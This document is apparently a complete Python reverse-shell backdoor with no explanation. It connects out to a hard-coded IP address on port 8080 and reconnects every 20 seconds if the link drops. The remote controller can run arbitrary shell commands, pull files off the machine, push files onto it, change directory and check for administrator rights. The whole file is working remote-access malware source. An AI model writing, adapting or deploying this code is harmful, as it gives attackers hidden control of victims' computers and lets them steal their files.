import socket
import subprocess
import os
import time
import ctypes  



def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False



def letGrab(mySocket, path):
    if os.path.exists(path):
        with open(path, 'rb') as f:
            packet = f.read(5000)
            while len(packet) > 0:
                mySocket.send(packet)
                packet = f.read(5000)
            mySocket.send('DONE'.encode())
    else:
        mySocket.send('File not found'.encode())



def letSend(mySocket, path, fileName):
    if os.path.exists(path):
        with open(path + fileName, 'ab') as f:
            while True:
                bits = mySocket.recv(5000)
                if bits.endswith('DONE'.encode()):
                    f.write(bits[:-4])
                    break
                f.write(bits)
    else:
        mySocket.send('Path not found on client'.encode())


def shell(mySocket):
    while True:
        try:
            command = mySocket.recv(5000).decode()


            if 'terminate' in command:
                mySocket.close()
                break


            elif 'check_privs' in command:
                if is_admin():
                    mySocket.send("[+] User has Administrator privileges".encode())
                else:
                    mySocket.send("[-] User has Standard privileges".encode())


            elif 'grab' in command:
                try:
                    grab, path = command.split("*")
                    letGrab(mySocket, path)
                except Exception as e:
                    mySocket.send(("[+] Grab Error: " + str(e)).encode())


            elif 'send' in command:
                try:
                    send, path, fileName = command.split("*")
                    letSend(mySocket, path, fileName)
                except Exception as e:
                    mySocket.send(("[+] Send Error: " + str(e)).encode())


            elif 'cd' in command:
                try:
                    code, directory = command.split(" ", 1)
                    os.chdir(directory)

                    mySocket.send(("[+] CWD: " + os.getcwd()).encode())
                except Exception as e:
                    mySocket.send(("[+] CD Error: " + str(e)).encode())


            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
                output = CMD.stdout.read() + CMD.stderr.read()

                mySocket.send(output if output else b"Command executed (no output)")

        except Exception:

            break


def tuneConnection():
    while True:
        try:
            mySocket = socket.socket()

            mySocket.connect(("192.168.220.128", 8080))
            shell(mySocket)
        except:

            time.sleep(20)
            continue


def main():
    tuneConnection()


if __name__ == "__main__":
    main()
